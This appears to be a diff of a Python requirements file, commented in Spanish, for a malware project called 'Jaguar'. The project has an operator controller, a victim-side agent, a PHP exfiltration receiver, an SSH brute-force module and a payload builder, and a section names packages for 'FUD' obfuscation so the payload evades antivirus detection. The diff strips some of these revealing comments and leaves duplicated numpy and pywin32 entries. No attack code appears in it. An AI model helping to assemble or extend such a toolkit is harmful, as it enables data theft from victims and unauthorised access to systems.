@@ -1,13 +1,6 @@
 # ============================================================================
-#  Jaguar v2.0.0 — requirements del CONTROLADOR (tu máquina de operador)
-#  El AGENTE (agente.py) no requiere nada de aquí: es autocontenido
-#  (stdlib + PIL/cv2 opcionales, que ya van embebidos en el .exe del builder).
-#  El receptor de exfiltración es PHP, no pip.
-#
-#  Instalación:
-#     python -m venv .venv
-#     .venv\Scripts\activate
-#     pip install -r requirements.txt
+#  Jaguar — requirements del CONTROLADOR
+#  El AGENTE (agente/agente.py) es autocontenido: stdlib + PIL/cv2 opcionales.
 # ============================================================================
 
 # --- Controlador (UI / red / escáner / geo) ---
@@ -21,21 +14,24 @@ psutil>=5.9
 # Sin esto, el módulo devuelve "paramiko no instalado" en vez de hacer el brute-force.
 paramiko>=3.4
 
-# --- Builder / empaquetado del payload ---
+# --- Builder / empaquetado ---
 pyinstaller>=6.12
 pillow>=10.0
+numpy>=1.26
 opencv-python>=4.8
 numpy>=1.26
 pywin32>=306 ; sys_platform == "win32"
 
-# --- Build avanzado (FUD / ofuscación) ---
+# --- Build avanzado ---
 nuitka>=2.4
 ordered-set>=4.1
 zstandard>=0.22
+
+# --- Ofuscación ---
 pyarmor>=9.0
 
-# --- Opcional: acelerador criptográfico ---
-# El agente usa AES/3DES en Python puro para no depender de nada en la víctima.
-# Si además quieres 'cryptography' en el controlador (scripts propios, tests),
-# descomenta. Es OPCIONAL: nada del flujo depende de ello.
+# --- Solo Windows ---
+pywin32>=306 ; sys_platform == "win32"
+
+# --- Opcional ---
 cryptography>=42.0
